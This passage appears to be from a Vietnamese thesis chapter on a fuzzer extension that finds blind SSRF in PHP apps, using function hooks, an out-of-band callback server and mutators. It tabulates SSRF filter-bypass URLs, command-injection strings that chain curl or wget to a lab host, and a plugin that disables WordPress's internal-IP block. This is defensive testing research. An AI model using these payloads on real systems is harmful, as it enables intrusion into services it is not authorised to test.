\texttt{/shared-tmpfs/ssrf-hooks/}:

\begin{verbatim}
function __fuzzer__ssrf_log(string $function, string $argument): void {
    $path = __FUZZER__SSRF_HOOKS_PATH . __FUZZER__COVID . '.json';
    if (file_exists($path)) { return; }  // first-write-wins
    $entry = json_encode([
        'function'  => $function,
        'argument'  => $argument,
        'timestamp' => time(),
    ]);
    file_put_contents($path, $entry);
    chmod($path, 0777);
}
\end{verbatim}

Chiến lược \textit{first-write-wins} (kiểm tra \texttt{file\_exists} trước
khi ghi) đảm bảo chỉ lần kích hoạt đầu tiên trong một request được ghi lại,
tránh ghi đè bởi các lần gọi hàm tiếp theo trong cùng request.

\subsection{Danh sách Hook}

Hệ thống cài đặt tổng cộng 23 hook qua
\texttt{uopz\_set\_hook}~\cite{phpgroup2023uopz} trên năm nhóm hàm,
tổng hợp trong Bảng~\ref{tab:php-hooks}.

\begin{table}[h]{Danh sách hook PHP theo nhóm chức năng}
\label{tab:php-hooks}
\centering
\small
\begin{tabular}{|l|l|p{4.2cm}|}
\hline
\textbf{Hàm PHP} & \textbf{Đối số kiểm tra} & \textbf{Ghi chú} \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm Network/HTTP (7 hàm)}} \\
\hline
\texttt{file\_get\_contents}  & \texttt{\$filename}  & Sink phổ biến nhất \\
\texttt{fopen}                & \texttt{\$filename}  & \\
\texttt{readfile}             & \texttt{\$filename}  & \\
\texttt{file}                 & \texttt{\$filename}  & \\
\texttt{get\_headers}         & \texttt{\$url}       & \\
\texttt{get\_meta\_tags}      & \texttt{\$url}       & \\
\texttt{getimagesize}         & \texttt{\$filename}  & Sink ẩn (image fetch) \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm cURL (3 hàm)}} \\
\hline
\texttt{curl\_exec}           & \texttt{curl\_getinfo(\$ch)['url']} & Đọc URL từ handle \\
\texttt{curl\_setopt}         & \texttt{\$value} khi \texttt{\$option=CURLOPT\_URL} & Bắt khi setopt \\
\texttt{curl\_multi\_exec}    & (qua \texttt{curl\_setopt})          & Hook phụ \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm Sockets (3 hàm)}} \\
\hline
\texttt{fsockopen}            & \texttt{\$hostname}  & \\
\texttt{pfsockopen}           & \texttt{\$hostname}  & \\
\texttt{stream\_socket\_client} & \texttt{\$address} & \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm Shell Execution (5 hàm) — CmdInj → SSRF}} \\
\hline
\texttt{shell\_exec}          & \texttt{\$cmd}       & \\
\texttt{system}               & \texttt{\$cmd}       & \\
\texttt{exec}                 & \texttt{\$cmd}       & \\
\texttt{passthru}             & \texttt{\$cmd}       & \\
\texttt{popen}                & \texttt{\$cmd}       & \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm WordPress Wrappers (5 hàm) — chỉ đăng ký khi WP được phát hiện}} \\
\hline
\texttt{wp\_remote\_get}       & \texttt{\$url}      & \\
\texttt{wp\_remote\_post}      & \texttt{\$url}      & \\
\texttt{wp\_remote\_request}   & \texttt{\$url}      & \\
\texttt{wp\_safe\_remote\_get} & \texttt{\$url}      & \\
\texttt{wp\_safe\_remote\_post}& \texttt{\$url}      & \\
\hline
\end{tabular}
\end{table}

Nhóm Shell Execution bao phủ kịch bản \texttt{CmdInjectionSSRFMutator}
chèn lệnh \texttt{curl}/\texttt{wget} vào đối số shell. Nhóm WordPress
chỉ được đăng ký khi \texttt{function\_exists('wp\_remote\_get')} trả về
\texttt{true}, tránh lỗi runtime trên môi trường PHP standalone.

\subsection{WordPress mu-plugin Bypass}

WordPress có cơ chế \texttt{WP\_HTTP::block\_request()} chặn mọi HTTP request
tới địa chỉ IP nội bộ theo RFC 1918 nhằm ngăn chặn SSRF. Trong môi trường
fuzzing, cơ chế này lại cản trở việc kiểm thử: nếu \texttt{wp\_remote\_get}
bị chặn trước khi thực thi, hook UOPZ sẽ không được kích hoạt và OOB server
sẽ không nhận được callback.

Để giải quyết, \texttt{entrypoint.sh} tự động cài đặt một
\textit{must-use plugin} (mu-plugin) vào thư mục
\texttt{wp-content/mu-plugins/} khi phát hiện môi trường WordPress:

\begin{verbatim}
<?php
// Fuzzer: allow WP_HTTP requests to private/internal IPs for SSRF detection
add_filter("http_request_host_is_external", "__return_true");
\end{verbatim}

Filter \texttt{http\_request\_host\_is\_external} trả về \texttt{true} vô
điều kiện, vô hiệu hóa \texttt{block\_request()} và cho phép
\texttt{wp\_remote\_get} thực sự gọi tới OOB server.

\subsection{PHP Stream Wrapper --- Phát hiện qua \texttt{include}/\texttt{require}}
\label{subsec:stream-wrapper}

\texttt{uopz\_set\_hook} hoạt động ở tầng hàm: cơ chế này chặn bắt lời
gọi tới các hàm PHP được khai báo trong bảng hàm (\textit{function table})
như \texttt{file\_get\_contents} hay \texttt{curl\_exec}. Cấu trúc ngôn
ngữ (\textit{language construct}) như \texttt{include} và
\texttt{require\_once} là thành phần cú pháp được tích hợp trực tiếp vào
Zend Engine, không tồn tại dưới dạng mục trong bảng hàm --- do đó UOPZ
không thể áp dụng hook cho chúng.

PHP cung cấp một cơ chế riêng để chặn bắt truy cập URL: \textit{stream
wrapper}. Khi PHP cần mở một URL (kể cả từ
\texttt{include("http://...")}), runtime tra cứu wrapper đã đăng ký cho
scheme tương ứng và gọi phương thức \texttt{stream\_open()} của lớp
wrapper đó. File \texttt{09\_ssrf\_stream.php} tận dụng cơ chế này bằng
cách đăng ký lớp \texttt{\_\_FuzzerSSRFStreamWrapper} thay thế wrapper
tích hợp sẵn cho cả hai scheme \texttt{http} và \texttt{https}:

\begin{verbatim}
foreach (['http', 'https'] as $scheme) {
    if (in_array($scheme, stream_get_wrappers())) {
        stream_wrapper_unregister($scheme);
        stream_wrapper_register($scheme, '__FuzzerSSRFStreamWrapper');
    }
}
\end{verbatim}

Khi \texttt{stream\_open()} được kích hoạt, wrapper kiểm tra URL bằng
hàm \texttt{\_\_fuzzer\_\_ssrf\_is\_oob()}, ghi nhận sự kiện nếu phát
hiện payload OOB, rồi thực hiện chuỗi thao tác \textit{khôi phục →
mở → đăng ký lại} để chuyển tiếp yêu cầu cho wrapper gốc xử lý, tránh
đệ quy vô hạn:

\begin{verbatim}
stream_wrapper_restore($scheme);    // tạm thời khôi phục wrapper gốc
$this->fp = @fopen($path, $mode);   // wrapper gốc thực hiện yêu cầu thực sự
stream_wrapper_unregister($scheme);
stream_wrapper_register($scheme, '__FuzzerSSRFStreamWrapper'); // đăng ký lại
\end{verbatim}

Cơ chế stream wrapper bổ sung khả năng phát hiện cho các trường hợp
Remote File Inclusion (RFI) mà hook UOPZ không xử lý được --- điển hình
là bWAPP với cấu trúc \texttt{include(\$language)} và Mutillidae với
\texttt{require\_once(\$page)}, trong đó URL do người dùng cung cấp được
nạp trực tiếp thông qua cấu trúc ngôn ngữ của PHP.

% ============================================================
\section{OOB Server}
\label{sec:oob-impl}
% ============================================================

\subsection{Kiến trúc Container}

Container \texttt{phuzz-oob} chạy hai tiến trình đồng thời được quản lý
bởi \texttt{supervisord}:

\textbf{dnsmasq.} Phân giải wildcard \texttt{*.oob} → \texttt{172.20.0.10},
cho phép các payload dạng \texttt{http://<token>.oob:8000/} của
\texttt{SSRFMutator} được ứng dụng mục tiêu phân giải đúng khi thực hiện
DNS lookup.

\textbf{Flask OOB listener.} HTTP server lắng nghe trên cổng 8000 (HTTP)
và cổng 8443 (HTTPS với self-signed certificate). Luồng HTTPS chạy trong
một Python thread riêng để không block Flask chính.

\subsection{Ghi nhận OOB Callback}

Mọi HTTP request đến container --- bất kể method (GET, POST, PUT, DELETE,
HEAD, OPTIONS, PATCH) và path --- đều được xử lý bởi một catch-all route:

\begin{verbatim}
@app.route("/<path:path>", methods=[...])
def catch_all(path: str):
    token = extract_token(request.path, request.host or "")
    if token:
        write_log(token, request.remote_addr or "unknown")
    return "", 200  # luôn trả về 200 OK
\end{verbatim}

Luôn trả về \texttt{200 OK} là thiết kế quan trọng: nếu OOB server trả về
lỗi, ứng dụng PHP có thể raise exception và che giấu tín hiệu hook SSRF.

\subsection{Trích xuất Token}

Hàm \texttt{extract\_token()} hỗ trợ hai phương thức trích xuất:

\begin{verbatim}
def extract_token(path: str, host: str = "") -> "str | None":
    first = path.strip("/").split("/")[0]
    if first:
        return first   # path-based: /abc123de → "abc123de"
    # subdomain-based: Host: abc123de.oob:8000 → "abc123de"
    if host:
        hostname = host.split(":")[0]
        if hostname.endswith(".oob"):
            subdomain = hostname.split(".")[0]
            return subdomain if subdomain else None
    return None
\end{verbatim}

Phương thức \textit{path-based} xử lý 17 trong 21 biến thể payload (IP-based,
nip.io, sslip.io, hostname-based).
Phương thức \textit{subdomain-based} xử lý 4 biến thể DNS-based còn lại
(\texttt{http://<token>.oob:8000/}).

\subsection{Ghi Log Nguyên tử}

Hàm \texttt{write\_log()} dùng mẫu \textit{write-to-temp + os.rename} để
đảm bảo file log không bao giờ ở trạng thái ghi dở:

\begin{verbatim}
def write_log(token: str, remote_ip: str) -> None:
    log_path = os.path.join(OOB_LOGS_DIR, f"{token}.json")
    if os.path.exists(log_path):
        return          # first-write-wins
    entry = json.dumps({
        "token": token, "ip": remote_ip,
        "timestamp": int(time.time()),
    })
    fd, tmp_path = tempfile.mkstemp(dir=OOB_LOGS_DIR, ...)
    with os.fdopen(fd, "w") as fh:
        fh.write(entry)
    os.chmod(tmp_path, 0o777)
    os.rename(tmp_path, log_path)   # atomic rename
\end{verbatim}

\texttt{os.rename()} trên Linux là thao tác nguyên tử tại tầng kernel đối với
cùng một filesystem, đảm bảo \texttt{VulnChecker} phía fuzzer không bao giờ
đọc file chưa hoàn chỉnh khi gọi \texttt{os.path.isfile()}.

% ============================================================
\section{Bộ đột biến SSRF}
\label{sec:mutator-impl}
% ============================================================

Hệ thống cung cấp hai mutator chuyên biệt cho phát hiện SSRF, phục vụ
hai kịch bản tấn công khác nhau.
\texttt{SSRFMutator} nhắm vào các tham số được ứng dụng dùng trực tiếp
làm URL trong lời gọi hàm mạng (sink URL-based).
\texttt{CmdInjectionSSRFMutator} nhắm vào các tham số được truyền vào
lệnh shell, khai thác lỗ hổng Command Injection để tạo ra kết nối SSRF
(sink shell-based).
Cả hai đều kế thừa \texttt{ParamMutator} và dùng chung cơ chế token
8 ký tự ghi vào \texttt{\_token\_map} để \texttt{SSRFVulnCheck} đối
chiếu tín hiệu OOB.

% ─────────────────────────────────────────────────────────────
\subsection{SSRFMutator}
% ─────────────────────────────────────────────────────────────

\texttt{SSRFMutator} sinh payload OOB theo phương pháp round-robin qua
21 biến thể. Với mỗi lần được chọn, mutator sinh một token 8 ký tự
(chữ thường + chữ số), lưu vào dict \texttt{\_token\_map} cùng
timestamp, rồi nhúng token đó vào biến thể tiếp theo trong chu kỳ:

\begin{verbatim}
@staticmethod
def _generate_token() -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choices(alphabet, k=8))
\end{verbatim}

Hai mươi mốt biến thể được tổ chức thành ba nhóm theo cơ chế định
tuyến tới OOB server, như liệt kê trong Bảng~\ref{tab:ssrf-variants}.
Ký hiệu \texttt{<t>} là viết tắt của token 8 ký tự.

\begin{table}[h]{Các biến thể payload của \texttt{SSRFMutator}}
\label{tab:ssrf-variants}
\centering
\small
\begin{tabular}{|c|p{8.5cm}|p{4.0cm}|}
\hline
\textbf{\#} & \textbf{Payload mẫu} & \textbf{Kỹ thuật bypass} \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm 1: IP-based — token nhúng trong URL path (biến thể 0–14)}} \\
\hline
0  & \texttt{http://<oob>/<t>}                         & Plain IP \\
1  & \texttt{http://2886795274:8000/<t>}                & Decimal IP \\
2  & \texttt{http://0xac14000a:8000/<t>}                & Hex IP \\
3  & \texttt{http://0254.024.0.012:8000/<t>}            & Octal IP \\
4  & \texttt{http://[::ffff:172.20.0.10]:8000/<t>}      & IPv6 mapped dotted \\
5  & \texttt{http://[::ffff:ac14:a]:8000/<t>}           & IPv6 mapped hex \\
6  & \texttt{http://172.20.0\%2e10:8000/<t>}            & URL-encoded dot \\
7  & \texttt{http://172.20.0\%252e10:8000/<t>}          & Double-encoded dot \\
8  & \texttt{http://x@<oob>/<t>}                        & Userinfo trick \\
9  & \texttt{http://trusted.com@<oob>/<t>}              & Reverse userinfo \\
10 & \texttt{HTTP://<oob>/<t>}                          & Mixed-case scheme \\
11 & \texttt{http://172.20.0.10.:8000/<t>}              & Trailing dot \\
12 & \texttt{http://<oob>/<t>\#trusted.com}             & Fragment bypass \\
13 & \texttt{http://172.20.0.10.nip.io:8000/<t>}        & nip.io DNS redirect \\
14 & \texttt{http://172.20.0.10.sslip.io:8000/<t>}      & sslip.io DNS redirect \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm 2: DNS-based — token nhúng trong subdomain (biến thể 15–18)}} \\
\hline
15 & \texttt{http://<t>.oob:8000/}                      & Wildcard DNS (\texttt{*.oob}) \\
16 & \texttt{https://<t>.oob:8000/}                     & HTTPS + wildcard DNS \\
17 & \texttt{http://x@<t>.oob:8000/}                    & Userinfo + DNS \\
18 & \texttt{HTTP://<t>.oob:8000/}                      & Mixed-case + DNS \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm 3: Hostname-based — qua \texttt{/etc/hosts} nội bộ (biến thể 19–20)}} \\
\hline
19 & \texttt{http://oob.phuzz:8000/<t>}                 & Hostname (\texttt{extra\_hosts}) \\
20 & \texttt{oob.phuzz:8443/<t>\#}                      & Scheme-less HTTPS bypass \\
\hline
\end{tabular}
\end{table}

Biến thể 20 (scheme-less) được thiết kế đặc biệt cho các ứng dụng tự
prepend \texttt{https://} vào giá trị tham số trước khi gọi hàm mạng
--- chẳng hạn plugin Canto (\mbox{CVE-2020-28975}), nơi payload plain IP
bị URL parser từ chối vì sai scheme. Đây là minh chứng điển hình cho
sự cần thiết của đa biến thể: một số lỗ hổng chỉ phát hiện được qua
đúng một biến thể nhất định.

% ─────────────────────────────────────────────────────────────
\subsection{CmdInjectionSSRFMutator}
% ─────────────────────────────────────────────────────────────

\texttt{CmdInjectionSSRFMutator} nhắm vào các endpoint mà tham số đầu
vào được truyền vào hàm shell (\texttt{shell\_exec}, \texttt{system},
\texttt{exec}, \texttt{passthru}, \texttt{popen}). Chiến lược là giữ
nguyên giá trị tham số gốc ở đầu payload --- để ứng dụng không báo lỗi
--- rồi nối thêm lệnh \texttt{curl}/\texttt{wget} trỏ tới OOB server
bằng một toán tử tách lệnh shell. Mười biến thể bao phủ các toán tử
phổ biến trên nhiều shell khác nhau (Bảng~\ref{tab:cmdinj-variants}).

\begin{table}[h]{Các biến thể payload của \texttt{CmdInjectionSSRFMutator}}
\label{tab:cmdinj-variants}
\centering
\small
\begin{tabular}{|c|l|p{9.5cm}|}
\hline
\textbf{\#} & \textbf{Toán tử} & \textbf{Payload mẫu} \\
\hline
0 & Semicolon    & \texttt{<val>; curl http://172.20.0.10:8000/<t>} \\
1 & Pipe         & \texttt{<val> | curl -s http://172.20.0.10:8000/<t>} \\
2 & Background   & \texttt{<val>\& curl http://172.20.0.10:8000/<t> \&} \\
3 & Logical-AND  & \texttt{<val> \&\& curl http://172.20.0.10:8000/<t>} \\
4 & Subshell     & \texttt{<val> \$(curl -s http://172.20.0.10:8000/<t>)} \\
5 & Backtick     & \texttt{<val> `curl -s http://172.20.0.10:8000/<t>`} \\
6 & wget         & \texttt{<val>; wget -q -O- http://172.20.0.10:8000/<t>} \\
7 & Newline      & \texttt{<val>}\textbackslash\texttt{ncurl http://172.20.0.10:8000/<t>} \\
8 & Null-byte    & \texttt{<val>\%00; curl http://172.20.0.10:8000/<t>} \\
9 & Hostname     & \texttt{<val>; curl http://oob.phuzz:8000/<t>} \\
\hline
\end{tabular}
\end{table}

Biến thể 4 (subshell \texttt{\$()}) và biến thể 5 (backtick) đặc biệt
hữu ích khi bộ lọc đầu vào chặn dấu chấm phẩy và dấu pipe nhưng bỏ
sót command substitution. Biến thể 8 (null-byte \texttt{\%00}) nhắm vào
các ứng dụng C/PHP tách chuỗi tại ký tự null. Biến thể 9 dùng hostname
\texttt{oob.phuzz} thay vì IP để vượt qua bộ lọc chặn địa chỉ RFC-1918
ở tầng shell.

% ─────────────────────────────────────────────────────────────
\subsection{Tích hợp vào Fuzzer}
% ─────────────────────────────────────────────────────────────

\texttt{SSRFMutator} được tích hợp vào \texttt{SingleMutator} qua lazy
import, đặt cùng danh sách với các \texttt{ParamMutator} gốc của Phuzz:

\begin{verbatim}
class SingleMutator(Mutator):
    def __init__(self):
        self.param_mutators = [
            IterateCharParamMutator(), AddCharParamMutator(),
            EquallyRandomCharParamMutator(), ...
            SuperRandomMutator()
        ]
        try:
            from ssrf_mutator import SSRFMutator
            self.param_mutators.append(SSRFMutator())
        except ImportError:
            pass
\end{verbatim}

Danh sách được xáo trộn ngẫu nhiên mỗi vòng iteration. Vì
\texttt{SSRFMutator} là một trong 13 mutator, xác suất mỗi lần đột biến
chọn \texttt{SSRFMutator} là khoảng $\frac{1}{13} \approx 7.7\%$.

Ngoài ra, hệ thống cung cấp hai mutator chuyên biệt:
\texttt{SSRFOnlyMutator} (mọi đột biến đều dùng \texttt{SSRFMutator})
và \texttt{CmdInjSSRFOnlyMutator} (mọi đột biến đều dùng
\texttt{CmdInjectionSSRFMutator}), dùng cho các endpoint mà người dùng
biết chắc là SSRF sink và muốn tập trung toàn bộ ngân sách đột biến vào
kiểm thử SSRF.

% ============================================================
\section{Cơ chế Phát hiện Hai Tầng và Chấm điểm}
\label{sec:feedback-impl}
% ============================================================

\subsection{SSRFVulnCheck: Kiểm tra Hai Tầng}

\texttt{SSRFVulnCheck} triển khai giao diện \texttt{VulnCheck} với phương
thức \texttt{check(candidate)}. Toàn bộ logic dựa trên đọc file từ
shared-tmpfs, không có blocking I/O hay network call:

\begin{verbatim}
def check(self, candidate) -> bool:
    # Tầng 1: PHP hook có ghi nhận không?
    hook_file = f"/shared-tmpfs/ssrf-hooks/{candidate.coverage_id}.json"
    if not os.path.isfile(hook_file):
        return False
    with open(hook_file) as fh:
        hook_data = json.load(fh)

    # Trích xuất token từ đối số hàm mạng
    argument = hook_data.get("argument", "")
    token = self._extract_token(argument)
    if not token:
        return False

    # Tầng 2: OOB server đã nhận callback không?
    oob_file = f"/shared-tmpfs/oob-logs/{token}.json"
    if not os.path.isfile(oob_file):
        return False

    # Xác nhận: cả hai tín hiệu đều có mặt
    candidate.score += SSRF_CRITICAL_SCORE  # += 1000
    ...
    return True
\end{verbatim}

Thiết kế \textit{AND logic} --- yêu cầu cả hai file tồn tại --- là yếu tố
cốt lõi loại bỏ false positive: Tầng 1 đơn độc chỉ chứng minh payload SSRF
đã lan truyền tới hàm mạng; Tầng 2 đơn độc có thể có false positive nếu
OOB server nhận kết nối từ nguồn khác. Sự kết hợp của cả hai mới là bằng
chứng đầy đủ của một lỗ hổng SSRF.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Flowchart logic phát hiện hai tầng của SSRFVulnCheck.
    % Bắt đầu: hình elip "check(candidate)".
    % Bước 1: hình thoi "ssrf-hooks/<covID>.json tồn tại?"
    %   → Không: hình chữ nhật "return False" (kết thúc).
    %   → Có: tiếp tục.
    % Bước 2: hình chữ nhật "Đọc argument từ hook file".
    % Bước 3: hình thoi "Trích được token từ argument?"
    %   → Không: "return False".
    %   → Có: tiếp tục.
    % Bước 4: hình thoi "oob-logs/<token>.json tồn tại?"
    %   → Không: "return False".
    %   → Có: tiếp tục.
    % Bước 5: hình chữ nhật "Tăng score += 1000, ghi ssrf-error-reports/".
    % Kết thúc: hình elip "return True (SSRF xác nhận)".
    % Ghi chú bên cạnh bước 4: "Tầng 2: OOB callback = bằng chứng mạng thực tế".
    % Ghi chú bên cạnh bước 1: "Tầng 1: PHP hook đã kích hoạt".
    \includegraphics[width=0.60\textwidth]{figures/fig-detection-flow}
    \caption{Sơ đồ luồng phát hiện lỗ hổng của \texttt{SSRFVulnCheck}.}
    \label{fig:detection-flow}
\end{figure}

\subsection{Trích xuất Token từ Payload}

Hàm \texttt{\_extract\_token()} xử lý đặc điểm riêng của từng nhóm biến thể
payload:

\begin{verbatim}
@staticmethod
def _extract_token(url: str) -> "str | None":
    # Xử lý Command Injection: trích URL từ lệnh shell
    if not lower.startswith(("http://", "https://", "ftp://")):
        m = re.search(r'https?://\S+', lower)
        if m:
            url = m.group(0)

    parsed = urlparse(url.lower())
    hostname = (parsed.hostname or "").rstrip(".")  # bỏ trailing dot

    # IP-based: token ở path segment đầu tiên
    if hostname == OOB_HOST:
        return parsed.path.strip("/").split("/")[0].split("#")[0] or None

    # DNS-based: token ở subdomain trái nhất của *.oob
    if hostname.endswith(f".{OOB_DOMAIN}"):
        return hostname.split(".")[0] or None

    # nip.io / sslip.io: OOB_HOST là prefix của hostname
    if hostname.startswith(f"{OOB_HOST}."):
        return parsed.path.strip("/").split("/")[0].split("#")[0] or None

    # Hostname-based: oob.phuzz → token ở path
    if hostname == OOB_HOSTNAME:
        return parsed.path.strip("/").split("/")[0].split("#")[0] or None
\end{verbatim}

Hai điểm kỹ thuật đáng chú ý: (1) \texttt{.rstrip(".")} xử lý biến thể
trailing dot (variant 11) khi PHP trả lại URL với dấu chấm thừa; (2) xử lý
Command Injection dùng \texttt{re.search} tìm URL được nhúng trong chuỗi
lệnh shell trước khi parse.

\subsection{Chấm điểm và Báo cáo}

Khi xác nhận SSRF, \texttt{SSRFVulnCheck} thực hiện ba hành động:

\begin{enumerate}
    \item \textbf{Tăng điểm}: \texttt{candidate.score += 1000}
    (\texttt{SSRF\_CRITICAL\_SCORE}). Điểm cao đảm bảo ứng viên SSRF được
    ưu tiên chọn trong các vòng lặp tiếp theo để tiếp tục đào sâu.
    \item \textbf{Ghi report}: JSON report với các trường \texttt{type},
    \texttt{candidateID}, \texttt{payload}, \texttt{url},
    \texttt{hookedFunction} được ghi vào
    \texttt{/shared-tmpfs/ssrf-error-reports/<candidateID>.json}.
    \item \textbf{Trả về \texttt{True}}: để framework Phuzz ghi nhận
    ứng viên vào \texttt{vulnerable\_candidates['SSRF']}.
\end{enumerate}

% ============================================================
\section{Tích hợp vào Vòng lặp Fuzz Chính}
\label{sec:integration}
% ============================================================

\subsection{Điểm Tích hợp trong fuzzer.py}

Tích hợp SSRF vào \texttt{fuzzer.py} được thực hiện tại hai điểm khởi tạo
trong hàm \texttt{\_\_init\_\_} của lớp \texttt{Fuzzer}:

\begin{verbatim}
from ssrf_vulncheck import SSRFVulnCheck
...
self.vulnchecker = ParamBasedVulnChecker(
    mysql_errors_folder=...,
    shell_errors_folder=...,
    ...
)
self.vulnchecker.vuln_checkers.append(
    SSRFVulnCheck(ssrf_errors_folder=self.ssrf_errors_folder)
)
\end{verbatim}

\texttt{SSRFVulnCheck} được append vào danh sách
\texttt{ParamBasedVulnChecker.vuln\_checkers} --- danh sách này được duyệt
tuần tự sau mỗi request. Không cần sửa đổi logic của
\texttt{ParamBasedVulnChecker}: SSRF hoạt động hoàn toàn như một plugin độc
lập.

\subsection{Luồng Thực thi Đầy đủ}

Hình~\ref{fig:sequence-ssrf} mô tả luồng thực thi đầy đủ từ khi fuzzer chọn
ứng viên đến khi xác nhận lỗ hổng SSRF qua cơ chế hai tầng.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sequence diagram đầy đủ của một chu kỳ phát hiện SSRF.
    % Các thực thể (cột từ trái sang phải, mỗi cột là một thanh dọc):
    %   SingleMutator | Fuzzer | phuzz-web (PHP) | phuzz-oob (Flask) | shared-tmpfs | SSRFVulnCheck
    % Luồng thông điệp theo số thứ tự:
    %   1. Fuzzer → SingleMutator: mutate(candidate).
    %   2. SingleMutator → SSRFMutator: mutate("old_value") — chọn ngẫu nhiên.
    %   3. SSRFMutator → SSRFMutator: sinh token "ab12cd34", lưu token_map.
    %   4. SSRFMutator → Fuzzer: trả về payload "http://172.20.0.10:8000/ab12cd34".
    %   5. Fuzzer → phuzz-web: HTTP POST [X-Fuzzer-Covid: req-001] url="http://172.20.0.10:8000/ab12cd34".
    %   6. phuzz-web → phuzz-web: PHP hook UOPZ kích hoạt → ghi ssrf-hooks/req-001.json.
    %   7. phuzz-web → phuzz-oob: GET /ab12cd34 HTTP/1.1 (PHP thực sự gọi file_get_contents).
    %   8. phuzz-oob → phuzz-oob: extract_token("/ab12cd34") = "ab12cd34".
    %   9. phuzz-oob → shared-tmpfs: write oob-logs/ab12cd34.json (atomic rename).
    %   10. phuzz-oob → phuzz-web: HTTP 200 OK.
    %   11. phuzz-web → phuzz-web: ghi coverage-reports/req-001.json.
    %   12. phuzz-web → Fuzzer: HTTP 200 OK (response bình thường, không có dấu hiệu SSRF).
    %   13. Fuzzer → SSRFVulnCheck: check(candidate "req-001").
    %   14. SSRFVulnCheck → shared-tmpfs: đọc ssrf-hooks/req-001.json → token="ab12cd34".
    %   15. SSRFVulnCheck → shared-tmpfs: đọc oob-logs/ab12cd34.json → EXISTS!
    %   16. SSRFVulnCheck → Fuzzer: True — ghi ssrf-error-reports/req-001.json.
    \includegraphics[width=\textwidth]{figures/fig-sequence-ssrf}
    \caption{Sequence diagram một chu kỳ phát hiện Blind SSRF.}
    \label{fig:sequence-ssrf}
\end{figure}

\begin{enumerate}
    \item Fuzzer chọn ứng viên $c$ từ hàng đợi; \texttt{SingleMutator} sinh
    đột biến $c'$ bằng cách chọn ngẫu nhiên \texttt{SSRFMutator} trong số
    13 mutator.
    \item \texttt{SSRFMutator.mutate()} sinh token 8 ký tự, lưu vào
    \texttt{\_token\_map}, trả về payload OOB theo biến thể round-robin.
    \item Fuzzer thêm header \texttt{X-Fuzzer-Covid: <ID>} và gửi HTTP
    request tới \texttt{phuzz-web}.
    \item PHP đọc \texttt{\$\_SERVER['HTTP\_X\_FUZZER\_COVID']} →
    \texttt{\_\_FUZZER\_\_COVID = <ID>}. \texttt{08\_ssrf.php} đã hook sẵn
    các hàm mạng.
    \item Khi ứng dụng gọi, ví dụ,
    \texttt{file\_get\_contents(\$\_GET['url'])} với URL là payload OOB:
    hook UOPZ kích hoạt \texttt{\_\_fuzzer\_\_ssrf\_log()} → ghi
    \texttt{ssrf-hooks/<ID>.json}.
    \item Đồng thời, PHP thực hiện HTTP request tới OOB server.
    Flask trên \texttt{phuzz-oob} nhận request → trích token → ghi
    \texttt{oob-logs/<token>.json}.
    \item Fuzzer nhận HTTP response; \texttt{ParamBasedVulnChecker} gọi
    \texttt{SSRFVulnCheck.check(c')}:
    (a) đọc \texttt{ssrf-hooks/<ID>.json} → lấy argument → trích token;
    (b) kiểm tra \texttt{oob-logs/<token>.json};
    (c) nếu cả hai tồn tại: xác nhận SSRF, tăng điểm 1000, ghi report.
    \item Fuzzer ghi nhận $c'$ vào \texttt{vulnerable\_candidates['SSRF']};
    ứng viên được giữ lại trong pool với điểm cao để tiếp tục đào sâu.
\end{enumerate}

\subsection{Xử lý Bất đồng bộ}

Bước 6 và bước 7 có thể không diễn ra theo đúng thứ tự: request SSRF do PHP
thực hiện đôi khi đến OOB server sau khi fuzzer đã kiểm tra
\texttt{oob-logs/<token>.json} (vì background job xử lý chậm). Trong
trường hợp này, \texttt{SSRFVulnCheck.check()} trả về \texttt{False} ở
lần kiểm tra đầu tiên.

Tuy nhiên, hook file \texttt{ssrf-hooks/<ID>.json} vẫn tồn tại và ứng viên
được giữ trong pool. Vào vòng lặp fuzz tiếp theo, nếu ứng viên được chọn lại
và gửi thêm đột biến, VulnChecker sẽ kiểm tra lại. Hơn nữa, vì token nằm
trong \texttt{\_token\_map}, fuzzer có thể bổ sung logic tra cứu trễ
(\textit{deferred lookup}) trong các vòng lặp sau.

\section{Tổng kết Chương}

Chương này đã trình bày đầy đủ cả lý thuyết lẫn cài đặt của hệ thống đề xuất.

SSRF là lớp lỗ hổng phức tạp với nhiều vector tấn công, đặc biệt nguy hiểm
trong hệ sinh thái PHP do tính năng stream wrapper và sự phổ biến của
WordPress API. Dạng Blind SSRF không để lại bất kỳ dấu hiệu trong HTTP
response hay coverage --- kênh OOB là tín hiệu duy nhất có khả năng xác nhận
lỗ hổng này. Cơ chế token-based correlation đảm bảo mỗi phát hiện được gắn
chính xác với ứng viên đã kích hoạt nó, loại trừ false positive ngay trong
môi trường song song.

Bốn container Docker phối hợp qua shared-tmpfs volume và mạng nội bộ cố định,
tạo ra hạ tầng hoàn chỉnh cho phát hiện Blind SSRF. Hook PHP (23 hook trên
5 nhóm hàm) thu thập tín hiệu in-band ngay tại thời điểm ứng dụng gọi hàm
mạng với payload của fuzzer. OOB server (Flask + dnsmasq, ghi log nguyên tử)
cung cấp tín hiệu out-of-band độc lập và không thể giả mạo. Bộ đột biến 21
biến thể bao phủ hầu hết các kỹ thuật bypass SSRF phổ biến. Logic AND hai
tầng của \texttt{SSRFVulnCheck} đảm bảo không có false positive.

Chương~4 sẽ đánh giá hiệu quả của hệ thống này trên các ứng dụng thực tế.
